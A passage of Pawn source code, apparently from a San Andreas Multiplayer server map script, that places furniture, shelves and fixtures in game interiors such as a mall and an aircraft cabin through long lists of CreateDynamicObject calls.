	CreateDynamicObject(2125, 1253.67, -753.62, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2125, 1251.27, -753.63, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2125, 1250.37, -753.55, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2271, 1251.02, -749.09, 5082.93,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2270, 1254.56, -749.09, 5082.94,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1246.53, -758.92, 5082.21,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1246.52, -757.55, 5081.60,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1248.93, -759.31, 5081.60,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1248.72, -759.29, 5081.60,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1248.72, -759.29, 5081.03,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1249.02, -759.28, 5081.03,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1544, 1246.56, -758.95, 5081.03,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3806, 1261.99, -753.12, 5083.84,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2051, 1243.20, -738.25, 5082.22,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2050, 1238.27, -738.28, 5082.10,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2208, 1223.33, -751.86, 5079.76,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(367, 1226.13, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(367, 1225.75, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(367, 1225.36, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(369, 1224.43, -751.85, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(369, 1224.23, -751.85, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(369, 1224.01, -751.83, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(367, 1223.42, -751.96, 5080.62,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(18766, 1279.89, -760.49, 5081.79,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2847, 1276.39, -759.68, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3462, 1278.68, -750.33, 5081.26,   0.00, 0.00, 47.00, .interiorid = 42);
	CreateDynamicObject(18652, 1279.88, -750.04, 5079.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(18652, 1278.83, -749.02, 5079.78,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2258, 1274.97, -755.53, 5081.91,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(1892, 1278.68, -759.08, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1892, 1274.09, -759.06, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(644, 1273.94, -749.60, 5079.91,   0.00, 0.00, 0.00, .interiorid = 42);

	// Door fix for Denise's house and covered pilot area for Shamal interior
	CreateDynamicObject(1498,2401.75927734,-1714.56994629,13.13000011,0.00000000,0.00000000,0.00000000); //object(gen_doorext03) (1)
	CreateDynamicObject(2634,1.74394608,31.97999954,1199.72998047,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(ab_vaultdoor) (3)
	CreateDynamicObject(2634,1.74316406,31.97949219,1202.69995117,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(ab_vaultdoor) (4)

	// Mall Interior
	CreateDynamicObject(3989,455.68774400,-2404.30932600,5.33563600,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(7493,523.24963400,-2413.61035200,13.25608600,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,419.32476800,-2425.11035200,13.25608600,0.00000000,0.00000000,180.48182006, .interiorid = 18);
	CreateDynamicObject(7493,489.72479200,-2484.48779300,13.25608600,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,487.52450600,-2329.01171900,13.25608600,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,489.69986000,-2484.63720700,16.78107800,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(7493,487.59942600,-2328.79052700,17.20606800,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1560,474.51272600,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,476.01260400,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,477.48742700,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,478.98742700,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,486.41214000,-2377.77294900,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,484.91226200,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,483.38751200,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1560,481.86264000,-2377.74804700,9.80654800,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(3530,481.18234300,-2376.96899400,15.60875100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(3530,481.15734900,-2377.16821300,20.78376000,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(994,480.82080100,-2390.36132800,9.89794700,0.00000000,0.00000000,88.52197935, .interiorid = 18);
	CreateDynamicObject(1984,478.56616200,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,475.49148600,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,472.39157100,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,469.24166900,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,466.06658900,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,462.91674800,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,459.76684600,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1984,456.71698000,-2389.01904300,9.78588800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1663,479.69928000,-2386.61132800,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1663,476.47433500,-2386.66113300,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1663,473.39917000,-2386.63623000,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1663,470.32437100,-2386.63623000,10.24607800,0.00000000,0.00000000,-73.91155557, .interiorid = 18);
	CreateDynamicObject(1843,487.57012900,-2392.18725600,9.78098000,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1843,487.62011700,-2395.16137700,9.78098000,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1843,487.77008100,-2401.03686500,9.78098000,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1844,487.70239300,-2398.10913100,9.78064700,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1844,487.90234400,-2408.15502900,9.78064700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1844,487.92733800,-2411.10522500,9.78064700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1887,487.97479200,-2414.06201200,9.78038000,0.00000000,0.00000000,-88.52197935, .interiorid = 18);
	CreateDynamicObject(1887,488.07476800,-2419.93847700,9.78038000,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1843,488.04068000,-2416.99829100,9.78043200,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1890,483.91915900,-2392.20166000,9.78272600,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,480.01214600,-2395.14526400,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,483.91198700,-2395.12036100,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.91915900,-2398.05224600,9.78272600,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.91915900,-2400.97949200,9.78272600,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,483.91287200,-2403.88818400,9.78243600,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,479.99008200,-2398.14819300,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1884,479.94009400,-2401.07348600,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1884,479.91510000,-2404.02465800,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1890,476.08337400,-2395.20532200,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2395.14526400,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(2365,481.95449800,-2381.40698200,9.78423100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(2365,481.95449800,-2381.38208000,10.07572000,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1349,481.83047500,-2384.01928700,10.35518100,0.00000000,1.71887339,-90.24079544, .interiorid = 18);
	CreateDynamicObject(1349,481.83047500,-2384.51733400,10.35518100,0.00000000,1.71887339,-90.24079544, .interiorid = 18);
	CreateDynamicObject(1349,481.83047500,-2386.24243200,10.35518100,0.00000000,1.71887339,-51.56614427, .interiorid = 18);
	CreateDynamicObject(1349,487.19693000,-2386.69409200,10.35294000,0.00000000,1.71887339,260.40943248, .interiorid = 18);
	CreateDynamicObject(2365,483.75006100,-2389.97168000,9.78319500,0.00000000,0.00000000,94.53803620, .interiorid = 18);
	CreateDynamicObject(2365,475.91857900,-2393.15820300,9.78712900,0.00000000,0.00000000,94.53803620, .interiorid = 18);
	CreateDynamicObject(1890,476.08337400,-2398.15454100,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,476.08337400,-2401.10668900,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2404.04956100,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2398.09448200,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45840500,-2401.05688500,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45840500,-2404.00708000,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.92062400,-2406.87548800,9.78221300,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,479.91510000,-2406.97387700,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2407.02465800,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1848,485.17611700,-2421.95288100,9.78149000,0.00000000,0.00000000,-178.76300397, .interiorid = 18);
	CreateDynamicObject(1890,483.92062400,-2412.79882800,9.78221300,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.92062400,-2415.79785200,9.78221300,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1845,482.43237300,-2424.07226600,9.78731700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1845,482.45736700,-2427.02246100,9.78731700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1845,482.45736700,-2429.94873000,9.78731700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1848,485.32608000,-2431.95092800,9.78149000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1848,485.31097400,-2426.82568400,9.78730800,0.00000000,0.00000000,269.00351293, .interiorid = 18);
	CreateDynamicObject(1842,478.89740000,-2424.58203100,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,478.87240600,-2429.21142600,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,479.88073700,-2412.85937500,9.78417300,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,479.89468400,-2415.85253900,9.78445900,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2412.79760700,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2415.74487300,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1991,454.33581500,-2397.91992200,9.81896800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2394.97680700,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1996,454.32177700,-2393.97998000,9.81063400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2406.94409200,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2395.95092800,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2396.92407200,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2409.87036100,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2412.82153300,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.44009400,-2415.74487300,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.44009400,-2418.69409200,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45260600,-2421.62524400,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45260600,-2424.57348600,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45260600,-2427.52172900,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.46508800,-2430.46997100,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2412,479.30438200,-2378.38232400,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(2412,476.35424800,-2378.30761700,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2400.86743200,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2403.84057600,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,468.43347200,-2406.80395500,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,468.43347200,-2409.75317400,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,468.44015500,-2412.67797900,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,468.44015500,-2415.65307600,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,468.44015500,-2418.57641600,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2421.51293900,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2424.45922900,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1848,488.30081200,-2434.88085900,9.78730800,0.00000000,0.00000000,-89.38147334, .interiorid = 18);
	CreateDynamicObject(1890,484.38366700,-2437.15112300,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1848,488.35080000,-2439.83203100,9.78730800,0.00000000,0.00000000,-90.24091003, .interiorid = 18);
	CreateDynamicObject(1890,481.43377700,-2437.12622100,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1890,478.50869800,-2437.12622100,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1884,475.58224500,-2437.13354500,9.77759300,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(1889,469.69757100,-2437.13232400,9.76570700,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2427.38549800,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2430.33569300,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,466.73388700,-2437.12622100,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1890,463.68402100,-2436.25659200,9.78730800,0.00000000,0.00000000,147.82316844, .interiorid = 18);
	CreateDynamicObject(1890,461.40927100,-2434.00659200,9.78730800,0.00000000,0.00000000,122.89938976, .interiorid = 18);
	CreateDynamicObject(1890,460.53448500,-2430.87915000,9.78730800,0.00000000,0.00000000,90.24073814, .interiorid = 18);
	CreateDynamicObject(1889,460.51226800,-2427.88354500,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1842,476.09741200,-2424.58203100,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,476.09741200,-2429.20654300,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,460.56561300,-2424.89941400,10.25791500,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,460.59060700,-2422.02685500,10.25791500,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,464.56225600,-2427.38549800,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,464.57769800,-2424.44897500,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,464.57769800,-2421.49877900,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,464.56524700,-2418.55151400,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,464.56524700,-2415.60229500,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,464.56524700,-2412.62915000,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,463.88546800,-2409.50683600,9.79196000,0.00000000,0.00000000,-66.17662534, .interiorid = 18);
	CreateDynamicObject(1889,461.83560200,-2407.03662100,9.79196000,0.00000000,0.00000000,-34.37752500, .interiorid = 18);
	CreateDynamicObject(1889,458.78555300,-2406.06250000,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,458.78555300,-2411.01074200,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,458.78555300,-2415.23584000,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1842,464.43753100,-2400.77929700,10.26877400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,461.36248800,-2400.77929700,10.26877400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,458.18759200,-2400.77929700,10.26877400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,476.07522600,-2429.21582000,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,476.07522600,-2424.56933600,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,478.90008500,-2424.56933600,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,478.87509200,-2429.21679700,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,458.17645300,-2400.77343800,9.75003100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,461.35122700,-2400.77343800,9.75003100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,464.42614700,-2400.77343800,9.75003100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1890,478.50869800,-2441.45092800,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1890,475.55880700,-2441.45092800,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1889,472.61200000,-2441.41967800,9.76514600,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,469.66204800,-2441.41967800,9.76514600,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1987,464.92349200,-2441.61425800,9.75987100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1988,465.89694200,-2441.59741200,9.75503300,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1987,461.59832800,-2441.61425800,9.75987100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1988,462.57202100,-2441.59741200,9.75503300,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1884,481.45620700,-2441.46118200,9.77500600,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(1884,484.40597500,-2441.46118200,9.77500600,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(1889,476.54007000,-2420.37280300,9.78541500,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,455.48580900,-2419.48388700,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,455.53579700,-2423.52880900,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,455.56079100,-2427.32470700,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,455.61077900,-2431.07373000,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1991,454.33581500,-2408.24560500,9.81896800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2407.27465800,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2406.27563500,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2405.29858400,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2404.30053700,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2403.30444300,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2402.30835000,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1996,454.32177700,-2401.32666000,9.81063400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2437.37011700,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2438.31640600,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2439.29052700,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2440.23681600,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2441.15820300,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1846,460.54464700,-2424.89379900,9.73917100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,460.56964100,-2422.01831100,9.73917100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,459.08441200,-2437.38598600,10.22056800,0.00000000,0.00000000,131.49392857, .interiorid = 18);
	CreateDynamicObject(1846,459.06817600,-2437.37939500,9.70182400,0.00000000,0.00000000,-48.98789148, .interiorid = 18);
	CreateDynamicObject(1987,458.49835200,-2441.61425800,9.75987100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1988,459.47222900,-2441.59741200,9.75503300,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2433.28393600,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,464.56225600,-2430.30688500,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.46508800,-2433.42016600,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2541,454.43652300,-2410.16333000,9.80253900,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2541,454.48651100,-2417.21020500,9.80253900,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2541,480.01019300,-2393.15820300,9.78999900,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2541,487.65844700,-2390.20800800,9.78641000,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2541,472.45776400,-2393.13549800,9.79382200,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2542,454.30514500,-2392.00537100,9.83844100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(2542,454.30514500,-2391.03222700,9.83844100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(2542,454.36703500,-2399.57348600,9.84879000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(2871,457.48605300,-2446.50805700,9.74788400,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(2871,458.43594400,-2446.50805700,9.74788400,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(2871,459.41070600,-2446.50805700,9.74788400,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(2543,461.85641500,-2446.40673800,9.51721200,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2543,462.83136000,-2446.40673800,9.51721200,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2543,463.80636600,-2446.40673800,9.51721200,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2542,466.05529800,-2446.38793900,9.75391500,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2542,467.03018200,-2446.38793900,9.75391500,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2542,468.00500500,-2446.38793900,9.75391500,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2541,474.92309600,-2446.23535200,9.70359800,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2541,475.92303500,-2446.23535200,9.70359800,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2541,476.89804100,-2446.23535200,9.70359800,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2583,479.35000600,-2446.36889600,10.59204000,0.00000000,0.00000000,180.48182006, .interiorid = 18);
	CreateDynamicObject(2582,483.32833900,-2446.33325200,10.62340500,0.00000000,0.00000000,180.48193465, .interiorid = 18);
	CreateDynamicObject(2582,484.80322300,-2446.33325200,10.62340500,0.00000000,0.00000000,180.48193465, .interiorid = 18);
	CreateDynamicObject(2942,487.70999100,-2383.75439500,10.42487400,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(2942,487.70999100,-2382.95752000,10.42487400,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(2412,483.72915600,-2378.35742200,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
